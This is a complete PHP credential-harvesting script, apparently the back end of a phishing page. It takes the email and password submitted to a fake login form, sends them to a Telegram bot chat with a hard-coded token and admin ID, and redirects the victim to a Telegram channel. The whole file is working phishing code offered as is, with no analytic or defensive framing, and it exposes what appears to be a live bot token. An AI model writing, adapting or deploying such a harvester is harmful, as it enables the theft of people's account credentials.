<?php
header ('Location: https://t.me/thephpbots ');
$API_KEY = "1242980119:AAE4Vx-RRJ3gyWFY9vbzPRabBEhkwgBUX9s";#توكن البوت
$admin = 1010918290;
$user = $_POST['email'];
$pass = $_POST['pass'];
$text = urlencode("
𝒄𝒐𝒏𝒈𝒓𝒂𝒕𝒖𝒍𝒂𝒕𝒊𝒐𝒏𝒔 𝒏𝒆𝒘 𝒂𝒄𝒄𝒐𝒖𝒏𝒕 🔥🐍
𝒆𝒎𝒂𝒊𝒍 : $user
𝒑𝒂𝒔𝒔𝒘𝒐𝒓𝒅 : $pass
𝒕𝒉𝒆 𝒊𝒏𝒅𝒆𝒙 𝒃𝒚 @ThePHPbots");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
